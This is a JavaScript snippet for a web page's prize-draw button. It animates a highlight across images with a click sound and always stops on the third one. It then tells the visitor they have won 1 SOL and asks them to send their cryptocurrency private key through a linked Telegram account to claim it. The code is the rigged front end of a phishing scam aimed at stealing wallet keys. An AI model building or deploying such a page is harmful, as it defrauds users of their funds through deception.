document.getElementById('selectBtn').addEventListener('click', function() {
    const images = document.querySelectorAll('.image');
    const clickSound = document.getElementById('clickSound');
    let currentIndex = 0;
    const messageDiv = document.getElementById('message');
    messageDiv.innerHTML = ''; // Clear any previous message

    const interval = setInterval(() => {
        images.forEach(img => img.classList.remove('selected'));
        images[currentIndex].classList.add('selected');
        clickSound.play(); // Play sound
        currentIndex = (currentIndex + 1) % images.length;
    }, 500); // Change images every 500ms

    setTimeout(() => {
        clearInterval(interval);
        images.forEach(img => img.classList.remove('selected'));
        if (images.length >= 3) {
            images[2].classList.add('selected');
            messageDiv.innerHTML = 'You win 1 SOL! Send your private key and receive your winnings within 8 hours: <a href="https://t.me/pump_fun_win" target="_blank">Claim Your Winnings</a><br><a href="index2.html" target="_blank">How can I send?</a>';
        }
    }, 500 * images.length); // Stop after one complete cycle
});
